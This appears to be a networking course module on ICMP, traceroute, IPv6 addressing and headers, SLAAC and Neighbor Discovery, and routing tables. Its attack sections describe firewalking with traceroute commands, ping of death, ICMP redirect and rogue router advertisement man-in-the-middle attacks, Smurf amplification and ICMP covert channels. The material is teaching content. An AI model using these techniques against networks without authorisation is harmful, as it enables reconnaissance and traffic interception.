Redirect Datagram for the Network (Code 0): This code indicates that the router has a better route to the destination network and is redirecting the packet to the sender's specified gateway. It instructs the sender to update its routing table with the new gateway information.
Redirect Datagram for the Host (Code 1): This code indicates that the router has a better route to the destination host and is redirecting the packet to the sender's specified gateway. It instructs the sender to update its routing table with the new gateway information.
Redirect Datagram for the Type of Service and Network (Code 2): This code is similar to Code 0 but also includes a Type of Service (ToS) component. It indicates that the router has a better route to the destination network with a specific Type of Service and is redirecting the packet accordingly.
Redirect Datagram for the Type of Service and Host (Code 3): This code is similar to Code 1 but also includes a Type of Service (ToS) component. It indicates that the router has a better route to the destination host with a specific Type of Service and is redirecting the packet accordingly.
Time Exceeded (Type 11):

Indicates that a packet's Time-to-Live (TTL) value has reached zero or that the packet's hop limit has been exceeded.
Subtypes of Time Exceeded include:
Time to Live Exceeded in Transit (Code 0): Indicates that the TTL of the packet expired while in transit.
Fragment Reassembly Time Exceeded (Code 1): Indicates that the time allowed for reassembly of fragments has expired.
Timestamp Request (Type 13):

Sent by a device to request a Timestamp Reply from another device.
Used to measure round-trip time and clock synchronization between devices.
Timestamp Reply (Type 14):

Sent by a device in response to a Timestamp Request.
Contains timestamps indicating the time the request was received and the time the reply was sent.


DEMO of ping to Google's DNS server (8.8.8.8)


Traceroute

Traceroute is a diagnostic tool used to trace the route taken by IP packets from a source device to a destination device in an IPv4 network.
It works by attempting to send messages to a target IP by incrementing its TTL by 1 each time until it reaches the target IP or after 30 hops.
Windows by default uses ICMP Type 8 (Echo Request) as the carrier protocol.
Linux by default uses UDP as the carrier protocol.
Starting with a TTL of 1, if it should receive a ICMP Type 11 (Time exceeded) message then it knows to increase the TTL by +1.
Traceroute uses the IP address in the ICMP Time exceeded message in its result of each hop along the route.
Many router hops may have ICMP disabled which will result in no reponse.
Traceroute identifies this with an asterisk (*).
Traceroute will still continue by increasing the TTL by 1.
It repeats the TTL +1 process until it reaches a TTL of 30 or if it gets a response from the target IP.
The captured IP's of the router hops that responded with a ICMP Time exceeded are added to the chart as hops along the route to the target IP.


The Traceroute shows in the details plane the IP header field has a source IP of where the TTL was exceeded. In the ICMP header a Type: 11 (Time-to-live exceeded) Code: 0 (Time to live exceeded in transit) error code. Also note that the following fields contains the original request packet information with the time exceeded error (TTL=1).
Common ICMP attacks

Fire-walking - Using traceroute and TTLs to map out a network. Using traceroute with TCP and UDP protocols an attacker could map the open ports on a firewall.

When performing traceroute. Linux will use UDP as its default. Windows will use ICMP Echo Requests as its default. Linux will require sudo when specifying any traceroute other than the default.

traceroute 8.8.8.8

Using traceroute with TCP. This will use TCP port 80 as the default.

sudo traceroute 8.8.8.8 -T

Using traceroute with TCP and a different port.

sudo traceroute 8.8.8.8 -T -p 443

Using traceroute with UDP and a different port.

sudo traceroute 8.8.8.8 -U -p 123

Using traceroute with ICMP (Windows Default)

sudo traceroute 8.8.8.8 -I

Over-sized ICMP informational messages - These over-sized ICMP packets can cause a system to crash. Typically packets should not be greater than 65,535 bytes in size and anything greater would violate [RFC 791] . Systems would not know how to process these packets and most likely would crash. The Ping-of-Death is one example of this. Attackers could use tools like hping2 to craft these packets.

ICMP redirects: - Routers use ICMP redirect messages to inform hosts that a better route is available for a particular destination is available through another router on the same network. Hosts can only be assigned one IP address as its default gateway but the network could have more than one router to lead to remote networks. If the default gateway receives a packet on an interface, and through its routing table lookup it determines that the next hop router towards that network is out the same interface that the packet was received, it will forward the packet to the next hop and send the ICMP redirect message back to the host. The host will update its internal routing tables for that specific destination address.


* An attacker can use ICMP redirects to perform a Layer 3 man-in-the-middle attack. If the attacker can intercept a message they can send an ICMP redirect back to the victim to tell it to route traffic through the attacker rather than the router.

* Note: ICMP redirects are disabled by default if Hot Standby Router Protocol (HSRP) is configured on the interface.
SMURF Attack: - SMURF attack is a form of amplification attack where an attacker can send very few packets and it will generate a lot of packets. The attack works by sending an ICMP echo request (PING) using a spoofed source address to a directed broadcast address of a network. This PING will reach all hosts on the network who will then respond to the spoofed IP address. All the hosts responding will create a lot of traffic and overload the victim's device causing a DoS.

IP unreachable messages to map a network - By default, routers will send an ICMP unreachable message back to the source if it drops a packet for whatever reason. This action can be used by attackers to map out the network topology.

ICMP Covert Channel - Many networks allow ICMP traffic in and out of their networks. Malicious actors can disguise communication channels as ICMP traffic. This traffic will have typical ICMP headers but the payload will greatly vary depending on the type of traffic encapsulated.



Resources


Instructor Note


2.1.2 Explain IPv6 Addressing¶
IPv6 (Internet Protocol version 6) is the most recent version of the Internet Protocol, designed to succeed IPv4. IPv6 addresses are used to uniquely identify and locate devices on a network. IPv6 was introduced to address the limitations of IPv4, primarily the exhaustion of available IPv4 addresses due to the rapid growth of the internet.

IPv6 addresses are 128 bits long, compared to the 32-bit addresses used in IPv4. This significantly expands the address space, allowing for a virtually unlimited number of unique addresses. The IPv6 address format is expressed as eight groups of four hexadecimal digits, separated by colons.

Hexadecimal Representation: IPv6 uses hexadecimal digits (0-9 and A-F) in groups of four, separated by colons. These groupings of 4 HEX are called "Hextets". This representation makes IPv6 addresses more concise than the dotted-decimal format used in IPv4.

Expanded Address Space: With 128 bits, IPv6 provides an enormous address space compared to the 32-bit address space of IPv4. The number of unique IPv6 addresses is approximately 2128, allowing for an abundance of unique addresses.

The 128-bit space if split into 2 64-bit parts called the Prefix and Interface ID.
In theory this grants the ability to create 264 of prefixs (Networks) with 264 of interface IDs (hosts) per network.
IPv6 Address Types: IPv6 defines different types of addresses, including unicast, multicast, and anycast addresses. Unicast addresses identify a single interface, multicast addresses represent a group of interfaces, and anycast addresses identify the nearest among a group of interfaces.

Global Unicast Addresses: Similar to public IPv4 addresses, global unicast IPv6 addresses are routable on the internet. They are assigned by Internet Assigned Numbers Authority (IANA) to Regional Internet Registries (RIRs), which then allocate them to Internet Service Providers (ISPs) and organizations.

Link-Local Addresses: Link-local addresses are used for communication on a single network segment (link). They are automatically configured by devices when no DHCP server is available, and they are not routable beyond the local network.

Unique Local Addresses: Unique local addresses are similar to IPv4 private addresses and are used for local communication within an organization. They are not routable on the global internet.

IPv6 Prefix Notation: IPv6 addresses often use a prefix notation to specify the network portion. For example, in the address 2001:0db8:85a3:0000:0000:8a2e:0370:7334, the prefix is 2001:0db8:85a3::/48, indicating the network portion.



Resources


Instructor Note


2.1.2.1 Describe IPv6 addressing and subnetting¶
IPv6 addressing

In 2011 IPv6 was released to use world wide. IPv6 was released to eventually replace IPv4 because of IPv4's lack of address space. Along with IPv6's release the packet design was simplified from the IPv4 15 sections header IPv6 holds only 8 sections with less wasted fields.

IPv6 addresses are 128 bits in length and will support up to 340 undecillian addresses.

64-bit Prefix (4 hextets) - Generally this is the network portion of the address.
Organizations assigned a 48-bit Prefix by IANA.
Last 16-bits of prefix is used for subnetting (allows upto 65,536 subnets).
64-bit Interface ID (4 hextets) - Generally this is the host portion of the address.
Allows for 264 hosts or 18,446,744,073,709,551,616 (eighteen quintillion, four hundred forty-six quadrillion, seven hundred forty-four trillion, seventy-three billion, seven hundred nine million, five hundred fifty-one thousand, six hundred sixteen).
IPv6 addresses are typically represented as eight groups of hexadecimal digits separated by colons, such as 2001:0db8:85a3:0000:0000:8a2e:0370:7334.
Leading zeros within each group can be omitted, and consecutive groups of zeros can be abbreviated with a double colon (::), but the double colon can only be used once in an address to avoid ambiguity.
Obstacles to transition:

Compatibility and Interoperability: During the transition period, both IPv4 and IPv6 networks need to coexist, requiring mechanisms for compatibility and interoperability. Dual-stack configurations, transition technologies, and network address translation (NAT) mechanisms are used to facilitate communication between IPv4 and IPv6 networks.
Legacy Infrastructure: Many existing networks, devices, and applications are built on IPv4 and may require significant updates or replacements to support IPv6. Legacy infrastructure poses a significant obstacle to IPv6 migration, especially for organizations with large and complex networks.
Cost and Investment: Transitioning to IPv6 often requires significant investments in equipment, software, training, and operational changes. For organizations with limited resources or competing priorities, the cost of migration can be a barrier.
Security Concerns: IPv6 introduces new security considerations and challenges, including the need for updated security policies, mechanisms, and tools. Organizations may be hesitant to adopt IPv6 due to concerns about potential security vulnerabilities and risks. Complexity of Deployment: Deploying IPv6 in large-scale networks or complex environments can be challenging due to the need for careful planning, coordination, and testing. Organizations may encounter technical issues, configuration errors, or unforeseen challenges during deployment.
Resistance to Change: Resistance to change or inertia within organizations can impede IPv6 adoption, especially in environments where IPv4 has been the standard for many years. Overcoming organizational resistance and fostering a culture of innovation and adaptation are essential for successful IPv6 migration.
[IPv6 adoption chart from Google]
IPv6 Subnetting



With IPv6 subnetting, a ISP is allocated a range of IPv6 addresses, which in turn assigns out to a company or organization a block or subnet for use. These allocations can vary in size for the Network ID and Subnet portions. In the example it shows a Network ID portion of 48 bits, or 12 hex digits, allocated for the network. The Subnet portion is allotted 16 bits, or 4 hex digits, for use in subnetting into smaller networks. The Network ID and the Subnet portions combined are known as the Prefix Length, represented in this example as a /64. The Host or Interface ID portion will be used for the actual assignment for the IPv6 address. This length is 64 bits or 16 hex digits long.


Resources


Instructor Note


2.1.2.2 Analyze IPv6 packet header¶
IPv6 Header





Version (4 bits): Indicates the version of the Internet Protocol being used. For IPv6, this field is set to 6.
Traffic Class (8 bits): Combines the functions of the IPv4 Type of Service (ToS) and Differentiated Services Code Point (DSCP) fields.
Used for quality of service (QoS) and packet prioritization.
Flow Label (20 bits): Used to label packets belonging to the same flow, allowing routers to apply specialized handling to those packets.
It allows routers and network devices to identify packets belonging to the same flow or traffic stream and apply consistent treatment, such as prioritization or routing policies.
Payload Length (16 bits): Specifies the length of the IPv6 payload, including any extension headers, in octets (8-bit units).
Next Header (8 bits): Indicates the type of the next header following the IPv6 header.
Comparable to the protocol field in the IPv4 header with a lot of the same values.
If the value corresponds to an IPv6 extension header, the processing of the packet continues with the specified extension header.
If the value corresponds to an upper-layer protocol (such as TCP or UDP), the packet payload is handed over to that protocol for further processing.
TCP: 6
UDP: 17
ICMPv6: 58
EIGRP: 88
OSPF: 89
Hop Limit (8 bits): Similar to the Time-to-Live (TTL) field in IPv4, specifies the maximum number of hops (routers) the packet can traverse before being discarded.
This field is comparable to the TTL field in the IPv4 Header.
Decremented by one by each router that forwards the packet.
Source Address (128 bits): Specifies the IPv6 address of the packet's source.
Address is expressed in HEX.
Examples:
fe80:0000:0000:0000:0000:0000:0000:1
2001:0db8:85a3:0000:0000:8a2e:0370:7334
Destination Address (128 bits): Specifies the IPv6 address of the packet's intended destination.
Address is expressed in HEX.
Examples:
fd00:1234:5678:9abc:0000:0000:0000:1
ff02:0000:0000:0000:0000:0000:0000:1
2001:0db8:85a3:0000:0000:8a2e:0370:7334
Decoding an IPv6 Packet:

IPv6 packets will have the label of 0x86DD in the Ethertype field of the Ethernet Header.


38 c9 86 2d 92 61 00 e0　4c 36 1c 43 86 dd 60 04
82 45 00 10 3a 40 20 01　0d b8 00 01 00 00 00 00
00 00 00 00 00 01 20 01　0d b8 00 02 00 00 00 00
00 00 00 00 00 02 80 00　31 e7 21 c1 00 07 5c 98
25 e4 00 02 4e 0f 
38 c9 86 2d 92 61 is the destination MAC address

00 e0 4c 36 1c 43 is the source MAC address
86 dd is the Ethertype for IPv6
60 04 82 45 is the Version, Traffic Class, and Flow Label fields.
6 is to identify the version is 6.
0 0 is the Traffic class. Similar to the DSCP field in IPv4.
4 82 45 is the Flow Label field. Used by IPv6 to tell routers to route all packets together.
00 10 is the Payload Length field. Does not measure the header size as it is always 40 bytes. Currently set to 16 bytes.
3a is the Next Header field. Currently set to identify ICMPv6.
06 is for TCP
11 is for UDP
40 is the Hop Limit field. Currently set to 64.
20 01　0d b8 00 01 00 00 00 00 00 00 00 00 00 01 is the source IP address. Currently set to 2001:db8:1::1.
20 01　0d b8 00 02 00 00 00 00 00 00 00 00 00 02 is the destination IP address. Currently set to 2001:db8:1::2.
The remaining will be the payload.
IPv6 extension headers



IPv6 extension headers are a crucial component of the IPv6 protocol, used to provide additional functionality beyond the basic packet header. They allow for a more flexible and extensible way of handling various features and options in network communication.

Extension headers are used to handle different aspects of IPv6 packet processing, such as routing, fragmentation, and security. They enable the IPv6 protocol to support a range of features while maintaining the efficiency of packet processing.

When used, extension headers will follow the IPv6 header. The IPv6 Next Header field is used to identify the following extension header. Each extension will identify the number of the following extension header until it reaches the user traffic header such as TCP (0x06 or 6), UDP (0x11 or 17), or ICMPv6 (0x3A or 58).

Types of Extension Headers:

Hop-by-Hop Options Header (0x00 or 0 in decimal): This header contains information that must be examined by every router along the packet's path. It is used for options that need to be processed by every node along the way.

Destination Options Header (0x00 or 0 in decimal): This header contains options that are processed only by the packet's destination node. It is often used for end-to-end options that need to be interpreted only by the final recipient.

Routing Header (0x2B or 43 in decimal): This header specifies a list of intermediate nodes (waypoints) through which the packet should be routed. It can be used for source routing, where the sender specifies the path the packet should take.

Fragment Header (0x2C or 44 in decimal)): This header is used for fragmentation and reassembly of packets that are too large to fit into the maximum transmission unit (MTU) of the network. Unlike IPv4, IPv6 requires fragmentation to be handled only by the source node.

No Next Header (0x3C or 60 in decimal): Indicates that there are no more headers following the current header.



DEMO of IPv6 Header


IPv6 inherently does not support fragmentation. Routers in the traffic path will not fragment any IPv6 packets. In fact any packets received with a larger size than its supported MTU will be dropped and an ICMPv6 Type 2 "packet too big" message will be sent to the source. This is essentially like having the DF bit set to "ON" (1) in an IPv4 packet. So any needed fragmentation will have to be done by the source node.

The source node will conduct a process called Path MTU Discovery (PMTU). The source node will send MTU discovery packets to the destination and waits to receive any ICMPv6 Type 2 "packet too big" message. If it does, it knows it needs to decrease the packet size. The minimum safe IPv6 MTU size is 1280 bytes and will guarantee delivery based on packet size but will increase the amount of needed packets to be sent.

Fragmentation was removed in IPv6 for several reasons. Many debated that fragmentation was inefficient. Any lost fragment makes the entire original packet unusable. This is because there is no way to identify the missing fragment that needs to be resent. So the entire packet needs to be resent and possibly re-fragmented. Additionally the security concerns of fragmentation overlapping attacks is another reason to remove fragmentation altogether.



Resources


Instructor Note


2.1.2.3 Describe key differences between IPv4 and IPv6¶


Some fields were kept the same (version, source, and destination address fields).

Version 4 or 6
IPv4 addresses are 32-bits in length
IPv6 addresses are 128-bits in length
Other fields perform the same function but have different names

TTL -> Hop count
Protocol -> Next header
Type of Service (TOS) (otherwise known as DSCP/ECN) -> Traffic class.
IPv6 does have one new field defined by [RFC 6437]. The flow label field enhances the traffic class field by allowing the association of traffic belonging to the same "flow" or "conversation". Additionally, extension headers defined in [RFC 2460 Section 4] are supported to enhance the functionality of the IPv6 header for specific functions.

IPv6 does not have an IHL field. This is because it has a static length of 40 bytes whereas IPv4 has a variable length header from 20 bytes (IHL=5) to 60 bytes (IHL=F).

IPv4 supports options that are appended to the header in 4-byte increments. Up to 40 bytes of options can be used. IPv6 does not use options but does support Extension Headers. Extension headers are not appended to the IPv6 header but rather are extra headers that follow the IPv6 header before the actual data.



Resources


Instructor Note


2.1.2.4 Explain IPv6 address representation¶
There are 128 bits in an IPv6 address that are divided into eight 16 bit groupings separated by colons (:). In IPv6 the term for a 16 bit grouping are called a hextet. Within each hextet the 16 bits are represented by 4 hex digits. When displaying the IPv6 address, leading zeros can be dropped. This same thing is done with IPv4.

When looking at an IPv4 addresses you can not diffrentiate the network portion or the host portion without pairing it with it's subnet mask.

100.10.10.10 for example is a unique address. But looking at it we do not know the actual network/subnet it resides on.
100.10.10.10 /8 would mean that the first 8 bits are "network bits" and the remaining 24 bits are "host bits". This would put the host on the 100.0.0.0 /8 network.
100.10.10.10 /16 would mean that the first 16 bits are "network bits" and the remaining 16 bits are "host bits". This would put the host on the 100.10.0.0 /16 network.
100.10.10.10 /24 would mean that the first 24 bits are "network bits" and the remaining 8 bits are "host bits". This would put the host on the 100.10.10.0 /24 network.
IPv6 addresses are inheriently split into 2 main parts.

The first 64 bits (or "Prefix") is used to represent the network portion.
The remaining 64 bits (or "Interface ID") is used to represent the host portion.
IPv6 CIDR expresses the number of bits in the network portion of the address. In the case of IPv6 addresses this can be up to /64 and not more. The exception to this rule is when using the /128 CIDR which is used to express the host IP address such as ::1/128 or 2001:ABCD:1234:DEF0:1111:2222:3333:4444 /128
IPv6 addresses can be very long. A method to help shorten the address is by dropping any leading zeros "0's"
:0001: can be shortened to :1:
A series of 0's can be shortened by replacing it with ::.
FE80:0000:0000:0000:0000:0000:0000:0001 can be simply expressed as FE80::1
When 2 or more consecutive 0's are present, only one can be shortened with the ::. It is the user's choice which.
FE80:0000:0000:0000:abcd:0000:0000:0001 can be shortned to FE80::abcd:0:0:1 or FE80:0:0:0:abcd::1.
The "::" notation can only be used once within an IPv6 address to avoid ambiguity. If it were allowed to appear multiple times in an address, it would be challenging to determine how many groups of zeros should be compressed at each occurrence.


Explanation of what is happening:

2001:0123:0000:0000:0000:1234:0000:AB11 - This shows the full IPv6 address, all digits are shown.

2001:123:0:0:0:1234:0:AB11 - Here the leading zeros are dropped, e.g. 0123 shortened to 123 and 0000 shortened to 0.

2001:123::1234:0:AB11 - Here the leading zeros are dropped and a one time compression of continuous zeroes has been performed indicated by the double colon (::).



Resources


Instructor Note


2.1.2.5 Identify IPv6 address types and scopes¶
IPv6 address types:

Unicast Addresses IPs are a "one to one" communication between two nodes.

These are similar in function to that of IPv4 unicast addresses.
Multicast Addresses Used for one to many communications and routing protocols.

These perform the same function as the Class D or multicast addresses of IPv4.
Range ff00::/8 - ff00:: thru ffff::
Anycast Addresses These addresses can fall within the Global, Unique-Local, or Link-Local address scopes. They differ from unicast in that more than one device can be configured with the same address. These are typically used to address several network gateways. Each gateway can be configured with the same anycast address. Any of these devices can supply the service request for the client. These can also be used for servers when trying to load balance a particular service.

Anycast addresses are assigned to a group of interfaces, but packets are routed to the nearest interface in the group based on routing metrics. They are not specifically defined by a separate address block but use the global unicast address space.
IPv6 address scope:

Unspecified address is used to indicate the absence of an address.

::/128
Loopback Address IPv6 address used by a node on a vitural interface to send packets to itself. This is the same as the 127.0.0.1 is for IPv4.

::1/128
Global Unicast Addresses IPv6 addressess that are routable over the Internet.

Scope is 2000::/3 - 2000:: thru 3fff::
2001:0000:/32 - reserved for Teredo tunneling
2001:20::/28 - reserved for [ORCHIDv2]
2002::/16 - reserved for 6to4 tunneling
Unique-Local Addresses (ULAs) IPv6 addresses the are routable locally within a site, not globally routable across the Internet. These perform a similar function as the RFC 1918 private IPv4 addresses and will require NAT to translate the address to a Global Unicast address for communication over the Internet.

Scope is fc00::/7 - fc00:: thru fdff::
Multicast addresses

Scope ff00::/8 - ff00:: thru ffff::
ffx0::/8 - reserved
ffx1::/8 - interface-local - spans only a single interface on a host. Used for loopback multicast.
ffx2::/8 - link-local - spans the local network. Does not traverse network bounderies. Comparable to 224.0.0.0/24 for IPv4.
ffx3::/8 - realm-local - spans farther than link-local but under determination of the administrator. Should not bound farther than those below.
ffx4::/8 - admin-local - smallest scope that can be administratively configured.
ffx5::/8 - site-local - spans a single site of an organization.
ffx8::/8 - organization-local - spans to all sites in a single organization.
ffxe::/8 - global - spans all hosts on the internet and is unbounded.
ffxf::/8 - reserved
Link-Local Addresses IPv6 addresses that are assigned to a IPv6 enabled interface for direct link on link communcations. Automatic link-local assignment is done if one is not manually assigned. Each IPv6 enabled device must have a link-local address defined for local communicaiton. These can not be used as routable addresses.

Scope fe80::/10 - fe80:: thru febf::
Address Ranges Reserved for Future Use

0000::/8 - Reserved for future use. This range is not currently allocated for any specific use.
2001::/23 - Reserved for documentation and examples. This address range is used in [RFC 3849] for illustrative purposes.
2001:db8::/32 - Reserved for use in documentation and examples to avoid conflicts with real-world IP addresses.
For a complete listing of IPv6 address assignments [IANA IPv6 Special Registry] or [RFC 4291].



Resources


Instructor Note


2.1.2.6 Explain IPv6 Auto Configuration with vulnerability¶
IPv6 Autoconfiguration is a mechanism that allows IPv6 hosts to automatically configure their IPv6 addresses and other network parameters without manual intervention.

Stateless Address Autoconfiguration (SLAAC) (default):

SLAAC is the primary method of IPv6 address autoconfiguration and is similar to IPv4 DHCP in some respects but simpler.
In SLAAC, routers on the local network periodically multicast Router Advertisement (RA) messages FF02::1 to announce their presence and provide network configuration information.
Hosts on the network receive these RA messages and use the information contained within them to configure their IPv6 addresses and other parameters.
Hosts can also send Router Solicitation (RS) message FF02::2 to request network information. This is commonly done when a host first powers on. The router will respond with a RA message to the host sent using FF02::1.
Each host uses its unique identifier (based on the MAC address or another mechanism) and the network prefix advertised in the RA messages to generate its IPv6 address.
Stateful/Stateless Address Autoconfiguration (DHCPv6):

DHCPv6 is an extension of the DHCP protocol used in IPv4 networks, and it provides additional configuration options beyond basic address assignment.
With DHCPv6, hosts can obtain IPv6 addresses, DNS server information, and other network configuration parameters from a DHCPv6 server.
DHCPv6 can be used in conjunction with SLAAC, allowing hosts to obtain additional configuration options from DHCPv6 while still using SLAAC for address assignment.
IPv6 zero configuration

When a node has IPv6 enabled on it's interface it is setup with an automatic assigning of link-local addresses that will work with zero configuration in the range of FE80::/10. Upon powering on, an IPv6 device will configured its own Link-Local address in the range of FE80::/10.

If configured for DHCPv6 it will perform a process called Stateless Address Autoconfiguration (SLAAC) as defined in [RFC 4862], Neighbor Discovery Protocol (NDP) using ICMPv6. The host will send a Router Solicitation (RS) message to the multicast address of FF02::2 (all routers). This message is intended to reach any IPv6 configured routers on the same network link as itself. The router will respond with a Router Advertisement (RA) message sent to the requesting node at its solicited node multicast address of FF02::1:FFxx:xxxx (xx:xxxx is the last 24 bits of the requester's interface ID). The RA is also sent to the multicast address of FF02::1 (all nodes) at regular intervals. In the message it will include:

IPv6 Global routing prefix (first 64 bits)
Prefix length (up to a /64)
Gateway address (the router's IP address)
Other additional options such as instructions to get further information from DHCPv6
The host will initiate the process to generate its own interface ID (last 64 bits). It will use either:

EUI-64 - The host will use its 48-bit MAC address and insert "FFFE" between the 3 Byte OUI and 3 Byte Vendor assigned ID. This insertion of 16-bits will make the full 64-bit Interface ID. It will then "flip" the 7th bit of the interface ID. Changing that bit from a 0 to a 1 or 1 to a 0.

Typically Nix systems and Cisco devices use EUI-64 by default.
Windows devices use Random Generation by default, but can be configured to use EUI-64.
a MAC address of fa:16:3e:c3:68:f2 will resolve an EUI-64 address of FE80::f816:3e *ff:fe* c3:68f2.
There are security concerns of EUI-64 in being able to reverse engineer it to a specific host MAC address.
Example 1 (Link-Local):
MAC: fa:16:3e:c3:68:f2
Append: ff:fe between OUI and Vendor assigned
Flip 7th bit
Result: FE80::f816:3eff:fec3:68f2
Example 2 (Global):
Prefix from RA: 2001:ABCD:1234:DEF0::
MAC: fa:16:3e:c3:68:f2
Append: ff:fe between OUI and Vendor assigned
Flip 7th bit
Result: 2001:ABCD:1234:DEF0:f816:3eff:fec3:68f2
Random generation - Random generation was developed to generate the interface ID using psudo random generation to avoid device fingerprinting.

Windows Vista and up use this process by default.
Can not be reversed to a MAC address but knowing that Windows using this method by default can be an indicator.
Examples:
Prefix from RA: 2001:ABCD:1234:DEF0::
Link-Local: FE80::cdc3:b3ac:1623:f552
Global: 2001:ABCD:1234:DEF0:182f:dd86:f2be:653b


DEMO of IPv6 Traffic


Advantage For typical home networks this is very useful. Users with little to no networking experience can easily setup their home networks with little intervention. All of the IP addresses, netmasks and gateways will be automatically configured for all devices.

Disadvantages On an enterprise network with specific address, netmask and other configurations it is not feasible to use this option as it may be to simplistic. Enterprise networks tend to opt for more precise controls for their networks. Additionally if zero configuration was allowed it could lead to users connecting unauthorized devices onto a secure network with no oversight.

[RFC 3756 IPv6 Neighbor Discovery (ND) Trust Models and Threats]

[RFC 3971 SEcure Neighbor Discovery (SEND)]

Man-in-the-Middle (MitM) attack with SLAAC - It is possible for a malicious actor to take advantage of SLAAC to create a MitM attack by impersonating a IPv6 router. IPv6 is not able to leverage ARP in order to perform MAC to IP resolutions for the local network. IPv6 utilizes a sub-set of the ICMPv6 protocol called "Neighbor Solicitation (NS)". One particular NS message called Router Advertisements (RA) messages are normally sent by routers to advertise the local network IPv6 Prefix. In addition to the prefix, these messages advertise the MAC address of the router. The hosts will accept this mesages and append their Interface-Id to generate their 128-bit IPv6 address for remote communication. If a malicious actor has percistance on the network they can send crafted RA messages for IPv6 clients to accept. By accepting these RA messages the hosts will record and save the sending MAC address as its "gateway" in the arp-cache.


DEMO Performing a ICMPv6 SLAAC MitM attack with Scapy


Resources


Instructor Note


2.1.2.7 Analyze ICMPv6 protocol and header structure¶
This protocol includes all the same functionality as ICMPv4 with some added features like Fragmentation, Neighbor Discovery, and Stateless Address AutoConfiguration (SLAAC). Another change between ICMPv6 and ICMPv4 is that version 6 allows multicast transmission not just unicast transmission.


The first image shows that the PC is performing a ping request to a network address of 2a01:2e0:3fe:1001:302::


The second image shows after the router received the ping request, it sends out a Neighbor Solicitation (ICMPv6 Type 135) to the Solicited-Node multicast address, in this case ff02::1:ff2d:3b8e. The Solicited-Node address was derived by the least-significant 24 bits of the unicast address (2d:3b8e) and appending them to the prefix ff02::1:ff/104. The router's source IPv6 is using its manual assigned Link-Local address fe80::1. This Neighbor Solicitation process is similar to the IPv4 ARP request.


The third image shows the PC's response, a Neighbor Advert![](isement (ICMPv6 Type 136), to the router's Neighbor Solicitation. The PC's IPv6 address is 2003:50:aa10:4243:221:6aff:fe2d:3b8e and the destination is back to the router's Link-Local address fe80::1. This Neighbor Advertisement process is similar to the IPv4 ARP reply.


The last image shows the router's ping reply to the PC.


Resources


Instructor Note
The pcap images are from the [werberblog site]. Student's can download the pcap and do the walk through themselves with the instructor.



2.1.2.8 Explain Neighbor Discovery Protocol (NDP)¶
IPv6 nodes use NDP to discover other nodes on the local link. This is to determine other node's link-layer addresses to find routers, and to maintain reachability information about the paths to active neighbor nodes. NDP is vulnerable to various attacks if not secured.

NDP defines five ICMPv6 packet types for the purpose of router solicitation, router advertisement, neighbor solicitation, neighbor advertisement, and network redirects.

Router Solicitation (Type 133)

Hosts inquire with Router Solicitation messages to locate routers on an attached link. Routers which forward packets not addressed to them generate Router Advertisements immediately upon receipt of this message rather than at their next scheduled time.
Sent using the multicast address of FF02::2 (all routers) group.
Router Advertisement (Type 134)

Routers advertise their presence together with various link and Internet parameters either periodically, or in response to a Router Solicitation message.
Sent using the multicast of FF02::1 (all nodes) group.
Neighbor Solicitation (Type 135)

Neighbor solicitations are used by nodes to determine the link layer address of a neighbor, or to verify that a neighbor is still reachable via a cached link layer address.
Similar to an ARP Request when using IPv4. IPv6 does not use ARP however. It uses Neighbor Solicitation to request the MAC address of the destination.
Duplicate Address Detection (DAD). Sent by host to the IPv6 address it intends to use. This is to determine if the address is already in use.
Neighbor Advertisement (Type 136)

Neighbor advertisements are used by nodes to respond to a Neighbor Solicitation message.
Similar to an ARP Reply when using IPv4. IPv6 does not use ARP however. It uses Neighbor Advertisement to respond to a Neighbor Solicitation.
Redirect (Type 137)

Routers may inform hosts of a better first hop router for a destination.


Resources


Instructor Note


2.2 Analyze Internetwork Routing¶
Internetworking is the ability of network to communicate with other networks via intermediate networking devices (routers, switches) and links (ethernet, fiber). IP, a layer 3 protocol, uses logical addresses. These logical addresses are used to determine how a packet gets forwarded from one network to another. To allow network-to-network communication a global addressing scheme is required so that each host can be uniquely distinguished. Every network is assigned a unique value (network ID) and all the hosts on that network share the same network ID but each has their own host ID. The combination of the network ID and host ID makes each address unique.

Routers, also called Gateways, are layer 3 devices that make their forwarding decisions based on the layer 3 logical address. When a router receives a packet, the packet is decapsulated to read the destination IP address. The router then will make a routing decision based on the routing table, encapsulate the packet with new layer 2 information and then forward it out a interface.



In the example above, the packet with a source IP of 192.168.1.10 arrives at the router's interface G0/0. The router will forward this packet onto it's destination of 172.16.1.15 out interface G0/1.



Resources


Instructor Note


2.2.1 Discuss Routing Tables¶
A router's job is to connect different networks. To do this the router must have a routing table that contains the networks known by the router to be able to forward on the packet. In this and the following sections it will be discussed what and how these network routes are added.

First we need to understand the different types of networks that you may see in a routing table.



Ultimate route is any routing table entry that has a next-hop IPv4 address, exit interface, or both.

Level 1 route is any route with the subnet mask (CIDR) is equal to or less than the classful mask of the network address. A level 1 route can be a:

Network route - A network route that has a subnet mask equal to that of the classful mask.

Class A - 255.0.0.0 (/8)
Class B - 255.255.0.0 (/16)
Class C - 255.255.255.0 (/24)
Supernet route - A network route with a mask less (smaller) than the classful mask.

192.168.0.0/16
These can be a range of IP addresses aggregated into a single, larger network address.
Commonly used as network summary routes.
Default route - A default route is a static route with the address 0.0.0.0/0 or ::.

Parent route is a level 1 network that is subnetted. A parent route will never be an ultimate route.

Level 2 child route are the subnets of a classful network address.



Different Routing Tables are displayed below.

Cisco Routing Table Example



Foundry Routing Table Example



Juniper Routing Table Example



Dell Routing Table Example





The primary functions of a router are to:

Determine the best path to send packets.

Builds and maintains routing tables to make this determination.
Uses directly connected networks, static routes, and dynamic routing protocols to assist in building and maintaining this routing table.
Forward packets toward their destination (this is called routing).

Strips the Frame header off packet from incoming interface.
Adds new Frame header to packet for outgoing interface.
Similar to switches where it builds a CAM table built of MAC address to determine how to forward frames towards the destination, the router builds routing tables on where and how to forward packets. The router builds the table including information such as Route Source, Destination Network/CIDR, AD, Metric, Next-hop address, Route Timestamp and Outgoing Interface. As shown in the figure below.



The routing table includes routes to what it determines is the "best route" to the destination network. When a packet enters a router it will be decapsulated. The frame is stripped off and it will examine the destination address in the packet. Using this address it looks to find the "best match" in the routing table. Once the best match is determined it will use the next hop address and exit interface. It will re-encapsulate the packet into the appropriate frame for the exiting interface network and send it out.


Packet Routing Flow





Best Route = Longest Match

Routers compare the destination address in the incoming packet to its entries in the routing table. It matches the address (bit by bit) to all the table entries and looks for the longest bit match it can find. Starting at the far left, it compares the bits up to the amounts of bits in the CIDR mask. (i.e. a /12 mask will match 12 bits and a /24 will match 24 bits.)

Since the IP packet only contains the IP address and not the subnetmask, the router does not know what network the address belongs to. So this matching process tries to narrow down the address to a list of "known" networks.

